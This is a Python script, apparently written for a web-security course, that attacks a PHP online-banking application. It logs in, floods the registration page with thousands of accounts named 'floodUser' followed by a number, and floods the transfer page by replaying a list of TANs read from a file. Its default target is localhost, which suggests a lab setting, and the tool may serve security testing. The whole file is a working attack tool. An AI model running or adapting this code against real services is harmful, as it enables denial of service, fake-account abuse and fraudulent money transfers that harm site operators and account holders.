__author__ = 'lorenzodonini'

import http.client
import datetime
import requests

def createHttpConnection(host, port):
    conn = http.client.HTTPConnection(host,port)
    return conn

def createHeaders(session_id = None, content = None):
    headers = dict()
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    if content != None:
        headers['Content-Type'] = content
    if session_id != None:
        headers['Cookie'] = 'PHPSESSID='+session_id
    return headers

def login(host,port):
    conn = createHttpConnection(host,port)
    headers = createHeaders(content='application/x-www-form-urlencoded')
    page = 'login.php'
    username = input('Insert username: ')
    pw = input('Insert password: ')
    params = 'username='+username+'&password='+pw
    #Sending the post request
    conn.request('POST','/'+page,params,headers)

    #Receiving now the response
    resp = conn.getresponse()

    data = resp.getheader('Set-Cookie')
    cookie = None
    if data != None:
        cookie = data.split('PHPSESSID=')[1].split(';')[0]
    conn.close()
    return cookie

def register(conn,headers,user,firstname,lastname,email,pw,address,phone,getId=False):
    params = 'username='+user+'&firstname='+firstname+'&lastname='\
             +lastname+'&email='+email+'&password='+pw+'&address='+address+'&telephone='+phone
    page = 'register.php'
    #Sending the post request
    conn.request('POST','/'+page,params,headers)

    #Receiving the response
    resp = conn.getresponse()
    if getId:
        redirectPage = resp.getheader('Location')
        return redirectPage

    return None

def floodRegistration(host,port):
    headers = createHeaders(None,'application/x-www-form-urlencoded')
    firstname = input('Enter the firstname to register: ')
    lastname = input('Enter the lastname to register: ')
    email = input('Enter the email to register: ')
    pw = input('Enter the pw to register: ')
    address = input('Enter the address to register: ')
    phone = input('Enter the phone to register: ')
    end = int(input('How many registrations? '))
    username = 'floodUser'
    getLastId = end-1
    result = -1
    time = datetime.datetime.now()

    for i in range(0,end):
        username = username+str(i)
        conn = createHttpConnection(host,port)
        if (i == getLastId):
            redirectPage = register(conn,headers,username,firstname,lastname,email,pw,address,phone,True)
            #conn.close()
            #conn = createHttpConnection(host,port)
            #result = followRegistrationRedirect(conn,redirectPage)
        else :
            register(conn,headers,username,firstname,lastname,email,pw,address,phone)
        conn.close()
        if (i>0 and i%1000 == 0):
            oldTime = time
            time = datetime.datetime.now()
            print("Performed 1000 registrations.")
            #print("1000 registrations completed. Time elapsed: "+str(time-oldTime))

    return result



def sendTransactionRequest(host,port,conn,header,account,amount,tan,comment):
    params = {'account':account,'amount':amount,'tan':tan,'comment':comment}
    page = '/tran.php'
    url = 'http://'+host+':'+str(port)+page
    resp = conn.post(url,data=params,headers=header)
    if (resp.status_code != 200):
        print("HTTP request unsuccessful: "+str(resp.status_code)+" "+str(resp.reason))
        return -1
    return 0

def floodTransactions(host,port,session,account,start=0,end=0):
    headers = createHeaders(content='application/x-www-form-urlencoded')
    tans = readTansFromFile('tans.txt')
    amount = int(input('Insert an amount for every transaction: '))
    start = int(input('Insert the start TAN: '))
    end = int(input('Insert the end TAN: '))
    conn = requests.Session() #Requests <3
    conn.cookies.set('PHPSESSID',session)
    for i in range(start,end):
        selectedTan = tans[i]
        code = sendTransactionRequest(host,port,conn,headers,account,amount,selectedTan,'more money!!')
        if code < 0:
            print("Aborting procedure")
            return
        else:
            print("Transaction succeeded for TAN "+selectedTan)
        conn.close()


#Please pass only the TAN List, without any headers
def readTansFromFile(filename):
    f = open(filename, 'r')
    lines = f.readlines()
    if len(lines) != 100:
        print("Invalid file contents. Need a list of 100 TANs")
        f.close()
        return None

    #Result structure
    tans = []
    for line in lines:
        tan = line.split('|')[1]
        tan = tan.strip()
        tans.append(tan)

    #Already sorted by TAN number. We can simply access a specific tan using indexes
    return tans

def setupHost():
    host = input('Insert the host: ')
    port = int(input('Insert the port number: '))
    return (host,port)

def setupAccount():
    account = input('Insert the account number: ')
    return account

def main():
    ACCOUNT = 102678 #DEFAULT
    HOST = 'localhost' #DEFAULT
    PORT = 8080 #DEFAULT
    session_id = None

    print('Select an operation:')
    print('0) exit')
    print('1) setup host and port')
    print('2) login')
    print('3) setup account no')
    print('4) transaction flood')
    print('5) registration flood')
    operation = input('Command: ')
    operation = int(operation)
    while operation != 0:
        if operation == 1:
            try:
                HOST,PORT = setupHost()[0:2]
            except:
                print("Coudln't setup host")
        elif operation == 2:
            try:
                session_id = login(HOST,PORT)
            except:
                print("Error while trying to log in")
        elif operation == 3:
            try:
                ACCOUNT = setupAccount()
            except:
                print("Error while setting up account")
        elif operation == 4:
            try:
                floodTransactions(HOST, PORT, session_id, ACCOUNT)
            except:
                print("Error while performing a transaction flood")
        elif operation == 5:
            try:
                floodRegistration(HOST, PORT)
            except:
                print("Error while performing a registration flood")
        operation = input('Command: ')
        operation = int(operation)

    print("Exiting...")

#SCRIPT BODY
main()
